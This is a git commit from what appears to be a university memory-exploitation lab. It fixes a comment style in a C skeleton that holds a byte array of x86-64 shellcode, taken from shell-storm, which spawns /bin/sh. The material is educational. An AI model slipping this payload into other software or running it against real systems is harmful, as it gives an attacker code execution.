4910e02537669714aaa0283f97bc35d35f0de823
Razvan Deaconescu <razvan.deaconescu@cs.pub.ro>
2018-12-19 14:56:56 +0200

    06-exploatarea-memoriei: Do proper commenting in C code

--- 06-exploatarea-memoriei/skel/run-shellcode/prog.c
+++ 06-exploatarea-memoriei/skel/run-shellcode/prog.c
@@ -1,6 +1,6 @@
 #include <stdio.h>
 
-# http://shell-storm.org/shellcode/files/shellcode-905.php
+/* http://shell-storm.org/shellcode/files/shellcode-905.php */
 const char shellcode[] = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";
 
 int main(void)
